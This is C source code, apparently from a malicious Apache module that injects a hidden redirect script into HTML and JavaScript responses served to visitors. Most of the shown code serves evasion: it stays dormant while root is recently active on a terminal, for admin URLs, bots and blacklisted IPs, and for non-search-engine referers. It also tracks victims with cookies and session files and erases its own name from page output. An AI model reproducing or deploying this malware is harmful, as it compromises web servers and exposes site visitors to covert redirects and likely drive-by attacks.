				struct passwd *user_rec;
				if ((user_rec = getpwnam(rec.ut_user)) != NULL && user_rec->pw_uid == 0)
				{
					time_t idle;
					char tty[sizeof(_PATH_DEV) + UT_LINESIZE];
					struct stat sb;
					char state;
					idle = 0;
					snprintf(tty, sizeof(tty), "%s%.*s", _PATH_DEV, UT_LINESIZE, rec.ut_line);
					if (stat(tty, &sb) == 0) 
					{
						state = sb.st_mode & (S_IWOTH|S_IWGRP) ? '+' : '-';
						idle = time(NULL) - sb.st_mtime;
					}
					if (idle < ROOT_IDLE_TIME)
					{
						return 0;	
					}
				}
			}
		}
		close(utmpfd);
	}
	return 1;
  }
  else
  {
    return 1;
  }	
}

int dl_check_SiteAdmin(ap_filter_t *f)
{
  if (DO_BAN_SITEADMIN > 0)
  {
	const char* admin_uri[] = {"ADMIN"};
	request_rec	*r = f->r;
	int i, j, k;
	int len_uri = strlen(r->uri);
	for (i = 0; i < sizeof(admin_uri)/sizeof(char*); i++)
	{
		int len_admin = strlen(admin_uri[i]);
		for (j = 0; j < len_uri - len_admin; j++)
		{
			int match = 1;
			for (k = 0; k < len_admin; k++)
			{
				if (toupper(r->uri[j+k]) != admin_uri[i][k])
				{
					match = 0;
					break;
				}
			}
			if (match == 1)
			{
				dl_SendIPToLocalBlacklist(f);
				return 0;
			}
		}
	}
  }
  else
  {
  	return 1;
  }
}

int dl_check_SiteKernel(ap_filter_t *f)
{	
	#ifdef DEBUG
		FILE* debug_f;
	#endif		
	if (DO_BAN_SITEKERNEL > 0)
	{
		if (DO_EXPLOIT_ONLY_SEO > 0)
		{		
			const char* good_referers[] = {"GOOGLE.", "YAHOO.", "YANDEX.", "RAMBLER.", "MAIL.RU", "BING.", "SEARCH.", "MSN.", "ALLTHEWEB.", "ASK.", "LOOKSMART.", "ALTAVISTA.", "WEB.DE", "FIREBALL.", "LYCOS.", "AOL.", "ICQ.", "NETZERO.", "FRESH-WEATHER.", "FREECAUSE.", "MYSEARCH-FINDER.", "NEXPLORE.", "ATT.", "REDROVIN.", "TOSEEKA.", "COMCAST.", "INCREDIMAIL.", "CHARTER.", "VERIZON.", "SUCHE.", "VIRGILIO.", "VERDEN."};
			request_rec *r = f->r;
			char* referer = (char*) apr_table_get(r->headers_in, "Referer");
		
			if (referer != NULL)
			{				
				int i, j, k;
				int len_referer = strlen(referer);
				for (i = 0; i < sizeof(good_referers)/sizeof(char*); i++)
				{
					int len_good = strlen(good_referers[i]);
					for (j = 0; j < len_referer - len_good; j++)
					{
						int match = 1;
						for (k = 0; k < len_good; k++)
						{
							if (toupper(referer[j+k]) != good_referers[i][k])	
							{
								match = 0;
								break;
							}
						}
						if (match == 1)
						{
							#ifdef DEBUG
								debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check SiteKernel, IP=%s, Referer=%s - good referer, uniq is not site-kernel\r\n", dl_ClientIP(f), dl_ClientIP(f), referer); fclose(debug_f);
							#endif						
							return 1;
						}
					}
				}
			}
			#ifdef DEBUG
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check SiteKernel, IP=%s, Referer=%s - BAD referer, uniq looks like SITE-KERNEL!\r\n", dl_ClientIP(f), dl_ClientIP(f), referer); fclose(debug_f);
			#endif								
			dl_SendIPToLocalBlacklist(f);
			return 0;
		}
		else // Check only referer != NULL & referer != host
		{
			const char* referer = (char*) apr_table_get(f->r->headers_in, "Referer");
			const char* host = f->r->hostname;
			if (host != NULL && referer != NULL && strstr(referer, host) == NULL)
			{
				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check SiteKernel - ok! Hostname:%s, Referer:%s\r\n", dl_ClientIP(f), host, referer); fclose(debug_f);
				#endif	
				return 1;
			}
			else
			{
				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check SiteKernel, referer looks like SITE-KERNEL! Hostname:%s, Referer:%s\r\n", dl_ClientIP(f), host, referer); fclose(debug_f);
				#endif
				dl_SendIPToLocalBlacklist(f);		
				return 0;
			}
		}
	}
	else
	{
		return 1;
	}
}

int dl_check_MyReferer(ap_filter_t *f)
{
	const char* referer = (char*) apr_table_get(f->r->headers_in, "Referer");
	const char* host = f->r->hostname;
	if (host != NULL && referer != NULL && strstr(referer, host) != NULL)
	{
		#ifdef DEBUG
			FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check referer, Referer=%s, Host=%s - ok\r\n", dl_ClientIP(f), referer, host); fclose(debug_f);
		#endif
		return 1;
	}
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Check referer, Referer=%s, Host=%s - BAD\r\n", dl_ClientIP(f), referer, host); fclose(debug_f);
	#endif	
	return 0;	
}

void JustCleanMyNameInBucket(apr_bucket_brigade *pbbIn, apr_bucket_brigade *pbbOut, apr_bucket *pbktIn, apr_bucket *pbktOut, conn_rec *c, ap_filter_t *f)
{
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Just cleaning my name in bucket\r\n", dl_ClientIP(f)); fclose(debug_f);
	#endif

	const char* data;
	apr_size_t len;
	apr_status_t rv;
	
	for (pbktIn = APR_BRIGADE_FIRST(pbbIn); pbktIn != APR_BRIGADE_SENTINEL(pbbIn); pbktIn = APR_BUCKET_NEXT(pbktIn))
   	{   		
  		if (APR_BUCKET_IS_EOS(pbktIn)) 
    	{
            apr_bucket *pbktEOS = apr_bucket_eos_create(c->bucket_alloc);
   	        APR_BRIGADE_INSERT_TAIL(pbbOut, pbktEOS);
       	   	continue;
        }
   	    rv = apr_bucket_read(pbktIn, &data, &len, APR_BLOCK_READ /*APR_NONBLOCK_READ*/);
   	    if (rv != APR_SUCCESS)
   	    {
		#ifdef DEBUG
			char errstr[512];
			memset(errstr, 0, sizeof(errstr));
			apr_strerror(rv, errstr, sizeof(errstr)-1);
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s apr_bucket_read unsuccessfull: %s\r\n", dl_ClientIP(f), errstr); fclose(debug_f);
		#endif        			
			continue;   	    	
   	    }
       
       	char* datastr;
		datastr = apr_bucket_alloc(len + 1, c->bucket_alloc);
		if (datastr == NULL)
        {
			#ifdef DEBUG
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: JustCleanMyNameInBucket() datastr = apr_bucket_alloc(%i)\r\n", dl_ClientIP(f), len + 1); fclose(debug_f);
			#endif	            	
        }
		memset(datastr, 0, len + 1);
		memcpy(datastr, data, len);
       	#ifdef CLEAN_MY_NAME
			char *find_and_clean = decrypt(f, CLEAN_MY_NAME);
			char *p_clear;
			if (p_clear = strstr(datastr, find_and_clean))
				memset(p_clear, ' ', strlen(find_and_clean));
		#endif
   	   	pbktOut = apr_bucket_heap_create(datastr, len, apr_bucket_free, c->bucket_alloc);
     	APR_BRIGADE_INSERT_TAIL(pbbOut, pbktOut);  
   	}
	#ifdef DEBUG
		debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Just cleaning my name in bucket - Finished Successfull!\r\n", dl_ClientIP(f)); fclose(debug_f);
	#endif
}

int dl_SetCookieKey(ap_filter_t *f, int key)
{
	time_t expires_time;
	if (key == RAW_COOKIE_VALUE)
	{
		expires_time = time(NULL) + TEMP_BAN_TIME;
	}
	else
	{
		expires_time = time(NULL) + KEY_TTL;
	}
	
	char expires_str[1024];
	memset(expires_str, 0, sizeof(expires_str));
	strftime(expires_str, sizeof(expires_str), "%a %d-%b-%Y %H:%M:%S %Z", gmtime(&expires_time));				
	char* curr_setcookie = (char*) apr_table_get(f->r->headers_out, "Set-Cookie");									

	char new_setcookie[4*1024+256];
	memset(new_setcookie, 0, sizeof(new_setcookie));

	snprintf(new_setcookie, sizeof(new_setcookie), "%s%i; expires=%s; path=/", decrypt(f, KEY_COOKIE_NAME), key, expires_str);
	
	if (strlen(new_setcookie) > 0)
	{
		#ifdef DEBUG
			FILE* debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Setting Cookie: %s\r\n", dl_ClientIP(f), new_setcookie); fclose(debug_f);
		#endif				
		apr_table_add(f->r->headers_out, "Set-Cookie", new_setcookie);
		return 1;
	}
		
	return 0;
}

typedef struct dl_cfg {
    int engine;
} dl_cfg;

static dl_cfg *dl_dconfig( const request_rec *r) {
    return (dl_cfg *) ap_get_module_config( r->per_dir_config, &dl_module);
}

static dl_cfg *dl_sconfig( const server_rec *s) {
    return (dl_cfg *) ap_get_module_config( s->module_config, &dl_module);
}

static void *dl_create_dir_config( apr_pool_t *p, char *dirspec) {
    dl_cfg *cfg;
    cfg = (dl_cfg *) apr_pcalloc( p, sizeof( dl_cfg));
    cfg->engine = 1;
    return (void *) cfg;
}

static void *dl_create_server_config( apr_pool_t *p, server_rec *s) {
    dl_cfg *cfg;
    cfg = (dl_cfg *) apr_pcalloc( p, sizeof( dl_cfg));
    cfg->engine = 1;
    return (void *) cfg;
}

static command_rec dl_directives[] = {
    AP_INIT_FLAG(
        "dlEngine",
        ap_set_flag_slot,
        (void *) APR_OFFSETOF( dl_cfg, engine),
        OR_OPTIONS,
        "dl module switcher"
    ),
    {NULL}
};

static void dl_in_filter(request_rec *r) {
    ap_add_output_filter("dl", NULL, r, r->connection);
}

static apr_status_t dl_out_filter(ap_filter_t *f, apr_bucket_brigade *pbbIn) {	
	
    request_rec        *r = f->r;
    conn_rec           *c = r->connection;
    apr_bucket         *pbktIn;
    apr_bucket_brigade *pbbOut;
    
	#ifdef DEBUG
		FILE* debug_f; debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s --------------- Starting, IP = %s, r->the_request = %s\r\n", dl_ClientIP(f), dl_ClientIP(f), r->the_request); fclose(debug_f);
	#endif
    
    dl_cfg *cfg = dl_dconfig(f->r);
    
    if (strstr(r->content_type, "text/html") == NULL && strstr(r->content_type, "javascript") == NULL && strstr(r->content_type, "text/js") == NULL )
    {
    	return ap_pass_brigade(f->next, pbbIn);
    }

	pbbOut = apr_brigade_create(r->pool, c->bucket_alloc);
    const char *data; 
   	apr_size_t len, addlen;
    apr_bucket *pbktOut;
    
    if (!dl_check_Raw(f) || !dl_check_AdminOnline(f) || !dl_check_SiteAdmin(f) || !dl_check_LocalBlacklist(f) || !dl_check_TempBanlist(f) || !dl_check_BotUserAgent(f) || !dl_check_BotIp(f))
    {
    	JustCleanMyNameInBucket(pbbIn, pbbOut, pbktIn, pbktOut, c, f);
    }	
    else
    {
    	int ClientKey = dl_GetClientKey(f);

		dl_Mode mode;
		dl_LoadSession(f, &mode);
		
		#ifdef DEBUG
			debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Loading session: IP = %s, SessFilename = %s, mode.modetype = %i, mode.key = %i, mode.time = %i, ClientKey = %i\r\n", dl_ClientIP(f), dl_ClientIP(f), dl_genFilenameSession(f), mode.modetype, mode.key, mode.time, ClientKey); fclose(debug_f);
		#endif			
		
		if (ClientKey != mode.key)
		{
			#ifdef DEBUG
				debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Different keys, calling JustCleanMyNameInBucket. mode.modetype = %i, mode.key = %i, ClientKey = %i\r\n", dl_ClientIP(f), mode.modetype, mode.key, ClientKey); fclose(debug_f);
			#endif				
			JustCleanMyNameInBucket(pbbIn, pbbOut, pbktIn, pbktOut, c, f);
		}
		else
		{
			if (mode.modetype == 1)
			{				
				if (dl_check_SiteKernel(f))
				{
					#ifdef DEBUG
						debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Modetype = 1, setting first key to second mode\r\n", dl_ClientIP(f)); fclose(debug_f);
					#endif								

					int key2 = genKey();					
					if (dl_SetCookieKey(f, key2) > 0)
					{
						mode.modetype = 2;
						mode.key = key2;
						mode.time = time(NULL);
						memset(mode.referer1, 0, sizeof(mode.referer1));
						char* referer = (char*) apr_table_get(r->headers_in, "Referer");
						if (referer != NULL)
						{
							memcpy(mode.referer1, referer, min(strlen(referer), MAX_REFERER_LENGTH-1));
						}
						memset(mode.referer2, 0, sizeof(mode.referer2));
						const char* host = f->r->hostname;
						memcpy(mode.referer2, host, strlen(host));
						dl_SaveSession(f, &mode);
					}
				}
				JustCleanMyNameInBucket(pbbIn, pbbOut, pbktIn, pbktOut, c, f);
			}
			else if (mode.modetype == 2 && dl_check_MyReferer(f))
			{
				int key3 = genKey();
				const char* insert_tags[] = {"</script>", "</style>", "</head>", "</title>", "</body>", "</html>"};				
				char js_inject[512];
				
				if (strstr(r->content_type, "text/html") != NULL)
					snprintf(js_inject, sizeof(js_inject), "%s", dl_GetRedirectScript(f, &mode));
				else if (strstr(r->content_type, "javascript") != NULL || strstr(r->content_type, "text/js") != NULL )
					snprintf(js_inject, sizeof(js_inject), "document.write('%s');", dl_GetRedirectScript(f, &mode));

				#ifdef DEBUG
					debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Modetype = 2, injecting iframe via JS: %s\r\n", dl_ClientIP(f), js_inject); fclose(debug_f);
				#endif	

   				int InjectedThisBrigade = 0;
		    	for (pbktIn = APR_BRIGADE_FIRST(pbbIn); pbktIn != APR_BRIGADE_SENTINEL(pbbIn); pbktIn = APR_BUCKET_NEXT(pbktIn))
			    {	
        			if (APR_BUCKET_IS_EOS(pbktIn)) 
			        {
       	    			apr_bucket *pbktEOS = apr_bucket_eos_create(c->bucket_alloc);
		    	        APR_BRIGADE_INSERT_TAIL(pbbOut, pbktEOS);
			            continue;
   	    			}
			        apr_bucket_read(pbktIn, &data, &len, APR_BLOCK_READ/*APR_NONBLOCK_READ*/);

					char* buf;
					char* datastr;
					datastr = apr_bucket_alloc(len + 1, c->bucket_alloc);
						
					if (datastr == NULL)
					{
						#ifdef DEBUG
							debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_out_filter() datastr = apr_bucket_alloc(%i)\r\n", dl_ClientIP(f), len + 1); fclose(debug_f);
						#endif								
					}
						
					memset(datastr, 0, len + 1);
					memcpy(datastr, data, len);
        
					#ifdef CLEAN_MY_NAME
						char *find_and_clean = decrypt(f, CLEAN_MY_NAME);
						char *p_clear;
						if (p_clear = strstr(datastr, find_and_clean))
							memset(p_clear, ' ', strlen(find_and_clean));
					#endif
			
					if (!InjectedThisBrigade)
        			{
       					int p_insert = 0;       	
      					char* c_insert;
						int taglen;
							
						if (strstr(r->content_type, "text/html") != NULL)
						{
							int i;
							for (i = 0; i < sizeof(insert_tags) / sizeof(char *); i++)
							{
								taglen = strlen(insert_tags[i]);
								if (c_insert = stristr(datastr, insert_tags[i]))
								{ 
									p_insert = (c_insert + taglen) - datastr;
									break;
								}
							}
						}
							
						if (strstr(r->content_type, "text/html") != NULL && p_insert == 0) // esli ne nashli teg kuda vstavitsa (vozmozhno eto sgenereniy JS a ne HTML), to otdat' bez izmeneniy
						{
       						addlen = 0;
       						buf = apr_bucket_alloc(len, c->bucket_alloc);
        					
       						if (buf == NULL)
       						{
								#ifdef DEBUG
									debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_out_filter() buf = apr_bucket_alloc(%i)\r\n", dl_ClientIP(f), len); fclose(debug_f);
								#endif	        					
       						}
        					
   							memset(buf, 0, len);
        					memcpy(buf, datastr, len);    								
						}
						else
						{
			        		char *addbuf;
			        		addbuf = js_inject;
							addlen = strlen(js_inject);
		    				buf = (char*) apr_bucket_alloc(len + addlen, c->bucket_alloc);
			    			
		    				if (buf == NULL)
		    				{
								#ifdef DEBUG
									debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_out_filter() apr_bucket_alloc(%i)\r\n", dl_ClientIP(f), len + addlen); fclose(debug_f);
								#endif								
							}
			    			
		   					memset(buf, 0, len + addlen);
	    					memcpy(buf, datastr, p_insert);
	    					memcpy(buf + p_insert, addbuf, addlen);
		   					memcpy(buf + p_insert + addlen, datastr + p_insert, len - p_insert);
    	   					InjectedThisBrigade = 1;
    	    													
							dl_SetCookieKey(f, RAW_COOKIE_VALUE);
							dl_DeleteSession(f);
        					#ifdef DEBUG
								debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Deleted session \r\n", dl_ClientIP(f)); fclose(debug_f);
							#endif								
						}
	    			}
		   			else
		   			{
        				addlen = 0;
        				buf = apr_bucket_alloc(len, c->bucket_alloc);
        					
        				if (buf == NULL)
        				{
							#ifdef DEBUG
								debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s ALLOC ERROR: dl_out_filter() buf = apr_bucket_alloc(%i)\r\n", dl_ClientIP(f), len); fclose(debug_f);
							#endif	        					
        				}
        					
    					memset(buf, 0, len);
	       				memcpy(buf, datastr, len);        	
	    			} 
        			pbktOut = apr_bucket_heap_create(buf, len + addlen, apr_bucket_free, c->bucket_alloc);
        			APR_BRIGADE_INSERT_TAIL( pbbOut, pbktOut);  
        			#ifdef DEBUG
						debug_f = fopen(DEBUG, "a"); fprintf(debug_f, "%s Injected OK \r\n", dl_ClientIP(f)); fclose(debug_f);
					#endif	
    			}	
			}			
			else
			{
				JustCleanMyNameInBucket(pbbIn, pbbOut, pbktIn, pbktOut, c, f);
			}
		}
	}
    apr_brigade_cleanup(pbbIn);
    return ap_pass_brigade(f->next, pbbOut);
}

static void dl_register_hooks( apr_pool_t *p) {
    ap_hook_insert_filter( dl_in_filter, NULL, NULL, APR_HOOK_MIDDLE);
    ap_register_output_filter( "dl", dl_out_filter, NULL, AP_FTYPE_RESOURCE);
}

module AP_MODULE_DECLARE_DATA dl_module = {
    STANDARD20_MODULE_STUFF,
    dl_create_dir_config,
    NULL,
    dl_create_server_config,
    NULL,
    dl_directives,
    dl_register_hooks
};
